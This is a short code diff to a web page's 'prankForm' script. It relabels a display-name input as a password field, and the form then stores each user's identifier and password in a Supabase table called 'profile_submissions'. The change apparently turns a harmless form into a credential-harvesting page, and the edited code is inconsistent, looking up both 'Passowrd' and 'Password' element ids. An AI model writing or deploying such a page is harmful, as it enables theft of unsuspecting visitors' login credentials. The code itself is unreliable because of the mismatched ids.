@@ -50,7 +50,7 @@
     const form=document.getElementById('prankForm');
     const button=document.getElementById('submitButton');
     const toast=document.getElementById('toast');
-    const displayNameInput=document.getElementById('displayName');
+    const displayNameInput=document.getElementById('Passowrd');
     const visibilityToggle=document.getElementById('toggleVisibility');
     let toastTimer;
     visibilityToggle.addEventListener('click',event=>{
@@ -58,7 +58,7 @@
       const isHidden=displayNameInput.getAttribute('type')==='password';
       displayNameInput.setAttribute('type',isHidden?'text':'password');
       visibilityToggle.textContent=isHidden?'Hide':'Show';
-      visibilityToggle.setAttribute('aria-label',isHidden?'Hide display name':'Show display name');
+      visibilityToggle.setAttribute('aria-label',isHidden?'Hide Password':'Show Password');
       visibilityToggle.setAttribute('aria-pressed',String(isHidden));
     });
     function showToast(message){
@@ -68,7 +68,7 @@
     form.addEventListener('submit',async event=>{
       event.preventDefault();
       const identifier=document.getElementById('identifier').value.trim();
-      const displayName=document.getElementById('displayName').value.trim();
+      const displayName=document.getElementById('Password').value.trim();
       button.disabled=true;
       try{
         const {error}=await supabase.from('profile_submissions').insert({
